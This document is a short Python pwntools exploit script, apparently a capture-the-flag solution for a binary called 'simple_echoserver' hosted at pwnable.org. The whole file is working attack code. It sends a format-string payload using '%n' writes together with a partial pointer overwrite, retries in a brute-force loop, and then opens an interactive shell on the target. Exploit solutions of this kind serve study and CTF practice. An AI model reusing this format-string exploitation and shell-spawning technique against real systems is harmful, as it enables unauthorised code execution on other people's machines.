from pwn import *

e = ELF("./simple_echoserver")
libc = ELF("./libc.so.6")

context.binary = e.path

devnull = open('/dev/null', 'w+b')

while True:
  try:
    is_remote = "--remote" in sys.argv
    def debug():
      if not is_remote:
        gdb.attach(p)

    if is_remote:
      p = remote("pwnable.org", 12020)
    else:
      p = process(e.path, stderr=devnull)
      # {"LD_PRELOAD": libc.path})


    p.sendlineafter("name:", "%" + str(0x2d72e - len("[USER] name: ")) + "d" + "%*48$d" + "%28$n")
    p.sendlineafter("phone:", "1" * 8 + "\x38")

    p.sendlineafter("yourself!", "~.")

    p.recvline()

    sleep(0.1)

    p.sendline("ls")
    p.recvline()

    p.interactive()
  except KeyboardInterrupt:
    sys.exit()
    pass
  except Exception as er:
    print(repr(er))
    continue
